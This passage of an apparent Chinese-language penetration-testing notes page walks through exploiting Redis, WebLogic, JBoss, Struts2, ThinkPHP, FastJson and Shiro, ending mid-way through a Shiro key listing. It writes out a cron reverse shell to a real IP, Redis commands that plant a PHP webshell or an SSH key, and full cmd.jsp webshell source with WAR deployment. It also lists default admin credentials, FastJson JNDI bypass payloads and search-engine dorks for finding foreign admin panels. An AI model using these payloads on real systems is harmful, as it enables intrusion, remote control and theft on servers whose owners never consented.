src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230827084813386.png" alt="image-20230827084813386"></p></li></ul></li><li><p>redis常用的指令</p><blockquote><p>redis连接远程服务器</p><p>redis-cli -h host -p port -a password</p><p>set testkey “testvalue” 设置testkey的值为testvalue</p><p>get testkey 获取testkey</p><p>set score 99 设置score的值为99</p><p>incr score 将score的值增加一</p><p>get score  获取score的值</p><p>keys *</p><p>列出所有的Key,注意没有values操作</p><p>config set dir &#x2F;home&#x2F;test 设置工作的目录是&#x2F;home&#x2F;test</p><p>config set dbfilename  redis.rdb 设置备份文件名</p><p>config get dir 检查工作目录是否设置成功</p><p>config get dbfilename 检查备份文件名是否设置成功</p><p>save  进行一次备份操作</p><p>flushall 删除所有的数据</p><p>del key 删除 key的数据</p></blockquote></li><li><p>redis的历史漏洞</p><ul><li><p>redis未授权漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230827090243781.png" alt="image-20230827090243781"></p></li></ul></li><li><p>漏洞利用</p><ul><li><p>环境搭建</p><blockquote><p>dicker-compose.yml</p></blockquote></li><li><p>也可以使用下面的环境</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%9B%BE__2023-08-27-09-40-49.png" alt="截图__2023-08-27-09-40-49"></p></li><li><p>写webshell</p><p>条件知道根目录</p><p>然后redis的未授权漏洞，我们可以上传我们的php一句话木马</p><p>具体的步骤如下</p><blockquote><p>redis-cli -h host -p port</p><p>config set dir 所知道的根目录路径</p><p>config set dbfilename shell.php</p><p>set x &lt;? @_eval($_POST[‘value’]);?&gt;</p><p>save</p></blockquote></li><li><p>getshell</p><p>我们只需要使用我们上传的路径指定位置，然后使用post传参，相当于得到了他的shell</p></li><li><p>写ssh公钥</p><p>0x00</p><p>先生成ssh密钥</p><blockquote><p>  ssh-keygen -t rsa  </p></blockquote><blockquote><p>  (echo  -e “\n\n”; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e “\n\n”) &gt; &#x2F;tmp&#x2F;foo.txt  cat &#x2F;tmp&#x2F;foo.txt  | redis-cli -h 122.114.225.148 -p 6379 -x set m  </p></blockquote><p>有很多\n的原因是因为需要把不同的密钥分开</p></li><li><p>写定时任务</p><blockquote><p>  redis-cli -h 122.114.225.148  -p 6379  </p><p>  config set dir &#x2F;var&#x2F;spool&#x2F;cron  </p><p>  config set dbfilename root  </p><p>  set xxx “\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp;  &#x2F;dev&#x2F;tcp&#x2F;124.71.45.28&#x2F;4433 0&gt;&amp;1\n\n”  </p><p>save</p></blockquote></li></ul></li></ol><h2 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h2><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><ol><li><p>简介</p><p>WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p></li><li><p>特性</p><p>默认端口：7001</p><p>Web界面：Error 404–Not Found</p><p>控制后台：<a href="http://ip:端口/console">http://ip:端口/console</a></p><p>注意这个console，他会跳转到登录界面</p></li><li><p>历史漏洞</p><p>Weblogic 10.3.6.0</p><p>Weblogic 12.1.3.0</p><p>Weblogic 12.2.1.1</p><p>Weblogic 12.2.1.2</p><p>Weblogic 12.2.1.3</p><p>Weblogic 14.1.1.0</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829123936456.png" alt="image-20230829123936456"></p></li><li><p>漏洞环境搭建</p><p>我的建议是，使用vulhub里面的环境使用docker-compose搭建</p></li><li><p>漏洞利用</p><ol><li><p>weakPassword</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829124748752.png" alt="image-20230829124748752"></p><blockquote><p>账号：weblogic</p><p>密码：Oracle@123</p></blockquote><blockquote><p><strong>system</strong>&#x2F;<strong>password</strong></p><p><strong>system</strong>&#x2F;Passw0rd</p><p>weblogic&#x2F;weblogic</p><p><strong>admin</strong>&#x2F;<strong>security</strong></p><p>joe&#x2F;<strong>password</strong></p><p>mary&#x2F;<strong>password</strong></p><p><strong>system</strong>&#x2F;<strong>security</strong></p><p>wlcsystem&#x2F;wlcsystem</p><p>wlpisystem&#x2F;wlpisystem</p></blockquote></li><li><p>cmd.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; &lt;% <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>); <span class="hljs-type">String</span> <span class="hljs-variable">output</span><br><span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123; <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-keyword">try</span> &#123; <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">sI</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream())); <span class="hljs-keyword">while</span><br>((s = sI.readLine()) != <span class="hljs-literal">null</span>) &#123; output += s +<span class="hljs-string">&quot;\r\n&quot;</span>; &#125; &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123; e.printSta<br><span class="hljs-title function_">ckTrace</span><span class="hljs-params">()</span>; &#125; &#125; out.println(output);%&gt;<br></code></pre></td></tr></table></figure><p>这段脚本的意思，就是创建一个执行环境，我们可以使用命令，他来执行</p></li><li><p>打包war包</p><blockquote><p>jar -cvf cmd.war cmd.jsp</p></blockquote></li><li><p>上传war包</p><p>这里需要使用weakPassword进行登录后台</p><p>部署-&gt;安装-&gt;上载文件-&gt;选择文件-&gt;下一步</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131331186.png" alt="image-20230829131331186"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131348097.png" alt="image-20230829131348097"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131414384.png" alt="image-20230829131414384"></p><p>记得选择.war文件</p><p>下一步，下一步，完成</p><p>但是这里出现了报错</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131632799.png" alt="image-20230829131632799"></p></li><li><p>如果顺利进行</p><p>就可以getshell了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131820267.png" alt="image-20230829131820267"></p><p>同时也可以使用蚁剑等软件</p></li></ol></li></ol><h2 id="java-开发框架漏洞"><a href="#java-开发框架漏洞" class="headerlink" title="java 开发框架漏洞"></a>java 开发框架漏洞</h2><h3 id="JBOSS漏洞"><a href="#JBOSS漏洞" class="headerlink" title="JBOSS漏洞"></a>JBOSS漏洞</h3><ol><li><p>JBOSS简介</p><p>一个基于J2EE的开放源代码的应用服务器</p><p>JBoss 是一个管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet&#x2F;JSP 的WEB容器，一般与<strong>Tomcat</strong>或<strong>Jetty</strong>绑定使用。Jboss是 <strong>Java EE</strong> 应用服务器（就像Apache是web服务器一样），专门用来运行Java EE程序的</p></li><li><p>JBOSS历史漏洞</p><ul><li><p>访问控制不严格导致的漏洞</p><blockquote><p>JMX Console未授权访问Getshell</p><p>Administration Console 弱口令 Getshell</p><p>CVE-2007-1036 – JMX Console HtmlAdaptor Getshell</p><p>CVE-2010-0738 – JMX控制台安全验证绕过漏洞</p></blockquote></li><li><p>反序列化</p><blockquote><p>CVE-2013-4810 – JBoss EJBInvokerServlet 反序列化漏洞</p><p>CVE-2015-7501 – JBoss JMXInvokerServlet 反序列化漏洞</p><p>CVE-2017-7504 – JBoss 4.x JBossMQ JMS 反序列化漏洞</p><p>CVE-2017-12149 – JBosS AS 6.X 反序列化漏洞</p></blockquote></li></ul></li><li><p>JBOSS漏洞的发现</p><p>只要出现以下的场景就会出现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829174426741.png" alt="image-20230829174426741"></p></li><li><p>JBOSS历史漏洞的利用</p><ol><li><h6 id="JMX-Console-未授权访问漏洞"><a href="#JMX-Console-未授权访问漏洞" class="headerlink" title="JMX Console 未授权访问漏洞"></a>JMX Console 未授权访问漏洞</h6><blockquote><p>Jboss的webUI界面 <a href="http://ip:port/jmx-console">http://ip:port/jmx-console</a> 未授权访问(或默认密码 <strong>admin&#x2F;admin</strong>)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取 webshell</p></blockquote></li><li><p>发现</p><p>由于只用JBOSS搭建的，我们可以试探性的访问</p><blockquote><p><a href="http://xx.xx.xx.xx/jmx-console/">http://xx.xx.xx.xx/jmx-console/</a></p></blockquote><p>看是否存在漏洞，如果访问成功就说明存在罗漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/wps9.png" alt="img"></p></li><li><p>漏洞利用</p><p>原理和weblogic是一致的</p><ul><li><p>远程部署war包</p><blockquote><p>找到 jboss.deployment 选项 (Jboss自带的部署功能）中的</p><p>flavor&#x3D;URL,type&#x3D;DeploymentScanner点进去（通过 url 的方式远程部署）</p><p>也可以直接输入以下URL进入：</p></blockquote><p>也可以输入URL进入</p><blockquote><p><a href="http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deploymen">http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deploymen</a></p><p>t:type&#x3D;DeploymentScanner,flavor&#x3D;URL</p></blockquote><p><img src="D:\hexo\source_posts\渗透\漏洞攻击利用.assets\image-20230829175122378.png" alt="image-20230829175122378"></p><p>进入页面后找到void addURL()</p><p>下面是部署远程的war包木马</p><blockquote><p><em>#</em> 打包冰蝎<em>jsp</em>马为<em>war</em>包</p><p>jar -cvf shell.war shell.jsp</p><p><em>#</em> 在<em>vps</em>上启动<em>web</em>服务</p><p>python -m <strong>http</strong>.server</p><p><em># war</em>包下载地址</p><p><strong>http</strong>:&#x2F;&#x2F;vps-IP:8000&#x2F;shell.war</p></blockquote><p>然后后点击Invoke部署</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175409944.png" alt="image-20230829175409944"></p><p>随后点击 Back to MBean View来到 URLList 中查看 Value 值是否已经部署好，并且为我们的远程war木马地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175542082.png" alt="image-20230829175542082"></p><p>最后点击 Apply Changes 后耐心等待一会儿，然后回到 JMX-Console 目录中</p><p>注意：等待的时间是有点长的</p><p>返回jmx-console 目录找到 jboss.web.deployment 查看是否存在我们部署的war木马</p><p>等到部署成功我们可以使用webshell管理程序</p></li></ul></li></ol></li></ol><h3 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h3><ol><li><p>简介</p><p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级</p><p>Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts1和Struts2；Struts2是一个基于</p><p>MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器</p><p>(Controller)来建立模型与视图的数据交互。Struts2是Struts的下一代产品，是在 struts1和WebWork的</p><p>技术基础上进行了合并的全新的Struts2框架。</p></li><li><p>历史漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180143397.png" alt="image-20230829180143397"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180158733.png" alt="image-20230829180158733"></p></li><li><p>历史漏洞原理分析</p><blockquote><p><a href="https://tttang.com/archive/1583">https://tttang.com/archive/1583</a></p><p><a href="https://su18.org/post/struts2-5/">https://su18.org/post/struts2-5/</a></p></blockquote></li><li><p>环境建议使用vulhub</p></li><li><p>漏洞发现</p><p><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a></p><p><a href="https://github.com/Guaang/s2-tool">https://github.com/Guaang/s2-tool</a></p><p><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></li><li><p>历史漏洞利用</p></li></ol><h2 id="php开发框架漏洞"><a href="#php开发框架漏洞" class="headerlink" title="php开发框架漏洞"></a>php开发框架漏洞</h2><h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><ol><li><p>简介</p><p>Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。</p></li><li><p>历史漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180720926.png" alt="image-20230829180720926"></p></li><li><p>漏洞发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180753344.png" alt="image-20230829180753344"></p><p>这个报错就出现了他的版本信息</p><ul><li><p>使用Fofa</p><blockquote><p>header&#x3D;”thinkphp” &amp;&amp; country!&#x3D;”CN”</p><p>header&#x3D;”thinkphp” &amp;&amp; country!&#x3D;”CN” &amp;&amp; <strong>title</strong>&#x3D;”后台管理”</p><p>header&#x3D;”thinkphp”&amp;&amp;country!&#x3D;”CN” &amp;&amp; <strong>title</strong>&#x3D;”后台管理” &amp;&amp; after&#x3D;”2021-01-01”</p></blockquote></li></ul></li><li><p>漏洞利用</p></li></ol><h2 id="FastJson漏洞"><a href="#FastJson漏洞" class="headerlink" title="FastJson漏洞"></a>FastJson漏洞</h2><ol><li><p>简介</p><p>Fastjson是阿里巴巴公司开源的一款JSON解析器，它可以解析 JSON 格式的字符串，是一个 Java</p><p>库， 支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 Java Bean。</p><p>可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><p><a href="https://www.runoob.com/w3cnote/fastjson-intro.html">https://www.runoob.com/w3cnote/fastjson-intro.html</a></p></li><li><p>历史漏洞</p><blockquote><p>Fastjson &lt;&#x3D;1.2.24 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.41 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.42 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.43 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.45 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.47 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.62 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.66 反序列化远程命令执行漏洞</p></blockquote><ul><li>FastJson &lt; 1.2.41</li></ul><p>  第一个Fastjson反序列化漏洞爆出后，阿里在1.2.25版本设置了autoTypeSupport属性默认alse，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。com.sun.rowset.jdbcRowSetlmpl在1.2.25版本被加入了黑名单，Fastjson有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名在加载进来那么就可以构造如下EXP</p><blockquote><p>{“@type”:”Lcom.sun.rowset.JdbcRowSetImpl;”, “dataSourceName”:”rmi:&#x2F;&#x2F;ip:9999&#x2F;rce_1_2_24_e</p><p>xploit”, “autoCommit”:<strong>true</strong>}</p></blockquote><ul><li><p>FastJson &lt; 1.2.42</p><p>阿里在发现这个绕过漏洞之后做出了类名如果为L开头;结尾的时候就先去掉L和;进行黑名单检验的方法，但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组L和;，构造exp如下，即双写L和;</p><blockquote><p>{“@type”:”LLcom.sun.rowset.JdbcRowSetImpl;;”, “dataSourceName”:”rmi:&#x2F;&#x2F;x.x.x.x:9999&#x2F;exp”,</p><p>“autoCommit”:<strong>true</strong>}</p></blockquote></li><li><p>FastJson &lt; 1.2.47</p><p>在1.2.47版本及以下的情况下，loadClass中默认cache为true，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，即可绕过黑名单</p><blockquote><p>{ “a”: { “@type”: “java.lang.Class”, “val”: “com.sun.rowset.JdbcRowSetImpl” }, “b”: {</p><p>“@type”: “com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”: “rmi:&#x2F;&#x2F;ip:9999&#x2F;exp”, “auto</p><p>Commit”: true }}</p></blockquote></li><li><p>FastJson &lt; 1.2.66</p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用，在1.2.25版本之后autoTypeSupport默认为false</p><blockquote><p>{“<strong>@type</strong>“:”org.apache.shiro.jndi.JndiObjectFactory”,”resourceName”:”ldap:&#x2F;&#x2F;ip:1389&#x2F;Calc”}</p><p>{“<strong>@type</strong>“:”br.com.anteros.dbcp.AnterosDBCPConfig”,”metricRegistry”:”ldap:&#x2F;&#x2F;ip:1389&#x2F;Calc”}</p><p>{“<strong>@type</strong>“:”org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup”,”jndiNames”:”ldap:&#x2F;&#x2F;ip:1389&#x2F;Calc”}</p></blockquote></li></ul></li><li><p>漏洞发现</p><ul><li><p>json认识</p><p><a href="https://www.runoob.com/json/json-tutorial.html">https://www.runoob.com/json/json-tutorial.html</a></p></li><li><p>FastJson寻找</p><p>Fastjson的作用是用于对JSON格式的数据进行解析和打包，所以出现Json格式的地方，就有可能使用了Fastjson</p></li><li><p>FastJson报错识别  <strong>必须是一行</strong> ，所以我们需要json格式化的东西</p></li><li><p>FastJson漏洞发现</p><p>原理：java.net.InetAddress 这个类在实例化时会尝试对 example.com 进行域名解析，这时候可以通过 dnslog 的方式得知漏洞是否存在</p><blockquote><p><a href="http://dnslog.cn/">http://dnslog.cn</a></p><p><a href="https://www.callback.red/">https://www.callback.red</a></p><p><a href="https://github.com/AlphabugX/Alphalog">https://github.com/AlphabugX/Alphalog</a></p><p><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a></p><p><a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></p><p><a href="https://github.com/lijiejie/eyes.sh">https://github.com/lijiejie/eyes.sh</a></p></blockquote><blockquote><p>{</p><p>“name”:{</p><p>“@type”:”java.net.InetAddress”,</p><p>“val”:”mingy.qydzoe.dnslog.cn”</p><p>}</p><p>}</p></blockquote><p>防止被黑名单</p><blockquote><p>{</p><p>“name”:{</p><p>“@type”:”LLjava.net.InetAddress;;”,</p><p>“val”:”mingy.qydzoe.dnslog.cn”</p><p>}</p><p>}</p></blockquote></li></ul></li><li><p>漏洞利用</p></li></ol><h2 id="Shiro漏洞"><a href="#Shiro漏洞" class="headerlink" title="Shiro漏洞"></a>Shiro漏洞</h2><ol><li><p>简介</p><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。</p><p>Shiro提供了应用程序安全性API来执行以下方面：</p><p>1）身份验证：证明用户身份，通常称为用户”登录”；</p><p>2）授权：访问控制；</p><p>3）密码术：保护或隐藏数据以防窥视；</p><p>4）会话管理：每个用户的时间敏感状态。</p><p>上述四个方面也被称为应用程序安全性的四个基石。</p></li><li><p>漏洞发现</p><ul><li><p>组件识别</p><p>在访问及登录时抓包，如果响应头set-cookie中显示<strong>rememberMe&#x3D;deleteMe</strong>，说明使用了Shiro组</p><p>件</p></li><li><p>漏洞搜索</p><p>通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。</p><p>例如fofa的搜索关键词：</p><blockquote><p>header&#x3D;”rememberme&#x3D;deleteMe”</p><p>header&#x3D;”shiroCookie”</p></blockquote></li></ul></li><li><p>历史漏洞</p><ul><li>Shiro-550</li></ul><blockquote><p>CVE-2016-4437 Shiro rememberMe 反序列化远程代码执行漏洞</p></blockquote><p>  Apache Shiro 框架提供了记住密码的功能（RememberMe），关闭浏览器再次访问时无需再登录即</p><p>  可访问。用户登录成功后用户信息会经过加密编码后存储在cookie中。在 Cookie 读取过程中有用</p><p>  AES 对 Cookie 值解密的过程，对于 AES 这类对称加密算法，一旦秘钥泄露加密便形同虚设。若秘钥可控，同时 Cookie 值是由攻击者构造的恶意 Payload，就可以将流程走通，触发危险的 Java 反序列化，从而导致远程命令执行漏洞。</p><p>  shiro 默认使用了CookieRememberMeManager，其处理cookie的流程是：</p><p>  <strong>获取 rememberMe的cookie值–&gt;Base64解码–&gt;AES解密 –&gt;反序列化</strong> 。</p><p>  但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为 cookie 的 rememberMe 字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/shiro/image-20230831213910270.png" alt="image-20230831213910270"></p><p>  只要<strong>rememberMe</strong>的<strong>AES</strong>加密密钥泄露，无论<strong>shiro</strong>是什么版本都可能会导致该漏洞的产生。硬编码是将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 <strong>Set-Cookie</strong> 中存在<strong>rememberMe&#x3D;deleteMe</strong> 字段，那么就可能存在此漏洞。</p><p>  常见的kry值：</p>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span 